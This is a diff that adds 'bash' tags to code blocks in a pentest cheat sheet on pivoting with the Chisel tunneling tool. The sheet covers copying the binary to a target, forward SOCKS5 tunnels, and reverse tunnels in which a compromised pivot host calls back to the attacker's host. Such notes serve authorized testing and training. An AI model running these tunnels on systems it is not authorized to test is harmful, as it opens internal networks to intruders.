@@ -5,19 +5,19 @@
 ---
 ## Installation
 
-```
+```bash
 git clone https://github.com/jpillora/chisel.git
 ```
 
 Clone the repository on the attack host.
 
-```
+```bash
 cd chisel && go build
 ```
 
 Compile the binary.
 
-```
+```bash
 scp chisel ubuntu@<target>:~/
 ```
 
@@ -26,19 +26,19 @@ Transfer the compiled binary to the pivot host.
 ---
 ## Forward Tunnel (Pivot Host as Server)
 
-```
+```bash
 ./chisel server -v -p 1234 --socks5
 ```
 
 Run on the pivot host. Listens for incoming connections on port `1234`. `--socks5` enables SOCKS5 support, forwarding traffic to all networks reachable from the pivot host. `-v` verbose output.
 
-```
+```bash
 ./chisel client -v <target>:1234 socks
 ```
 
 Run on the attack host. Connects to the Chisel server and creates a TCP/UDP tunnel via HTTP over SSH. Starts a local SOCKS5 listener on port `1080`.
 
-```
+```bash
 tail -f /etc/proxychains.conf
 ```
 
@@ -51,19 +51,19 @@ socks5 127.0.0.1 1080
 ---
 ## Reverse Tunnel (Attack Host as Server)
 
-```
+```bash
 sudo ./chisel server --reverse -v -p 1234 --socks5
 ```
 
 Run on the attack host. `--reverse` enables reverse tunnel mode, allowing the client (pivot host) to initiate the connection and expose its internal network.
 
-```
+```bash
 ./chisel client -v <lhost>:1234 R:socks
 ```
 
 Run on the pivot host. Connects back to the attack host. `R:socks` instructs the server to listen on the default SOCKS port (`1080`) and proxy traffic through the pivot host's internal network.
 
-```
+```bash
 ./chisel client -v <lhost>:1234 R:8888:127.0.0.1:8888
 ```
 
